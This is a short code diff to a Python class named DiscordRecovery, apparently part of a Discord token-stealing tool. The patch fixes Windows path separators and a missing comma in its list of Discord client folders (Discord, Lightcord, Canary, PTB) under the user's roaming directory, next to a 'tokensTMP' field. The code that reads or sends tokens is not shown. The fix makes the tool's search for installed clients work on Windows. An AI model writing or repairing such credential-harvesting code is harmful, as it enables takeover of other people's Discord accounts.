@@ -40,11 +40,11 @@ class DiscordRecovery(ModuleManager):
             os.makedirs(self.discord_folder)
         
         self.discordInstallations = [
-                [f"{Constant.roaming_dir}/Discord","Discord"],
-                [f"{Constant.roaming_dir}/Lightcord","Lightcord"],
-                [f"{Constant.roaming_dir}/discordcanary","DiscordCanary"],
-                [f"{Constant.roaming_dir}/discordptb","DiscordPTB"]
-                [f"{Constant.roaming_dir}/Lightcord","LightCord"]
+                [f"{Constant.roaming_dir}\\Discord","Discord"],
+                [f"{Constant.roaming_dir}\\Lightcord","Lightcord"],
+                [f"{Constant.roaming_dir}\\discordcanary","DiscordCanary"],
+                [f"{Constant.roaming_dir}\\discordptb","DiscordPTB"],
+                [f"{Constant.roaming_dir}\\Lightcord","LightCord"]
         ]
         
         self.tokensTMP = ''
